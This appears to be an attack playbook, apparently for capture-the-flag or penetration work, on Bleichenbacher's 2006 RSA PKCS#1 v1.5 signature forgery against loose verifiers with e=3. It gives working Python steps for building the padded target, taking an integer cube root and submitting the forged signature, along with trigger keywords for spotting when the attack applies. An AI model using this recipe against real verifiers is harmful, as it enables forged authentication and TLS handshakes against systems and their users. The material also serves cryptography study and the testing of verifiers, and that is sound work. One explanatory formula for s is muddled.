# RSA-PKCS#1 v1.5 Signature Forgery (Bleichenbacher 2006)

## When this applies

- A verifier accepts RSA-PKCS#1 v1.5 signatures and **does not strictly check** the right-hand padding/structure.
- Public exponent `e = 3` (or another small value) is common; the attack is most practical for `e = 3`.
- Trigger keywords: "RSA signature", "e=3", "DigiNotar", "Bleichenbacher 2006 forgery", "PKCS1 v1.5 signature".

## Technique

A correctly formatted PKCS#1 v1.5 signature pads as `0x00 0x01 FF…FF 0x00 ASN1(SHA-256, hash)`. A non-strict verifier checks only:

- Leading `0x00 0x01`.
- A run of `0xFF` bytes ending in `0x00`.
- An ASN.1 structure parses *somewhere* and the inner hash matches.

It may **fail** to verify that the structure occupies the entire low portion of the modulus — leaving room for arbitrary garbage at the end.

For `e=3`, find a value `s` such that `s^3 mod n` looks like a valid (but loose) signature of message `m`:

```
s^3 ≈ 0x00 01 FF…FF 00 ASN1(hash) GARBAGE
```

Since `e=3`, `s` is roughly `n^(1/3) * (target)^(1/3)`. Compute `s = ceil((target)^(1/3))` over the integers (no modular reduction!). The garbage at the end of `s^3` is ignored by the loose verifier.

## Steps

### 1. Confirm loose verifier

Test with a slightly malformed signature (e.g. extra trailing bytes after ASN.1). If accepted, the verifier is loose. Common in old OpenSSL forks, GnuTLS pre-2014, and various implementations of TLS handshake signatures.

### 2. Compute target hash

```python
import hashlib
hash_bytes = hashlib.sha256(message).digest()

# ASN.1 prefix for sha256 in PKCS1 v1.5 signatures
asn1_prefix = bytes.fromhex(
    "3031300d060960864801650304020105000420"
)
suffix = asn1_prefix + hash_bytes  # this must appear in s^3
```

### 3. Build target

```python
modulus_bytes = (n.bit_length() + 7) // 8
# Place suffix far enough right that some 0xFF runs and 0x00 separator fit on the left.
# Leave plenty of garbage room on the right.
target = b"\x00\x01" + b"\xff"*8 + b"\x00" + suffix + b"\x00" * 100
target_int = int.from_bytes(target, 'big')
```

### 4. Cube root over integers

```python
import gmpy2
s, exact = gmpy2.iroot(gmpy2.mpz(target_int), 3)
s = int(s) + 1   # ceil
```

The "garbage on the right" tolerates the rounding error of the cube root.

### 5. Submit `s`

Send `s` as the forged signature for `message`. Loose verifier accepts.

## Verifying success

- Verifier accepts your `s` as a valid signature on `message` (returns success / proceeds with TLS handshake / authenticates request).
- Modular: `pow(s, 3, n)` shows the expected leading bytes (`0x00 0x01 FF FF … 00 30 31 …`).

## Common pitfalls

- **Strict verifier.** Modern OpenSSL, BoringSSL, mbedTLS validate full structure — attack fails. Confirm looseness first.
- **`e` other than 3.** For `e = 65537`, you'd need to compute a 65537-th root, which is not feasible without the private key. Attack is `e ∈ {3, 5, 7}` territory.
- **Wrong ASN.1 prefix.** Each hash function has its own DER-encoded `AlgorithmIdentifier` prefix. SHA-1, SHA-256, SHA-512 differ.
- **Cube root rounding direction.** Use `ceil` so `s^3 ≥ target`. The garbage at the right swallows the difference.
- **Modulus boundary.** `s^3` must be < `n` (otherwise modular reduction kicks in). Choose `target` carefully so `target < n`.

## Tools

- `gmpy2.iroot(x, n)` for integer `n`-th root.
- `pycryptodome` to encode the ASN.1 prefix correctly via `Crypto.Hash.SHA256` + `pkcs1_15`.
- Reference: Bleichenbacher, "RSA Signature Forgery", CRYPTO 2006 rump session.
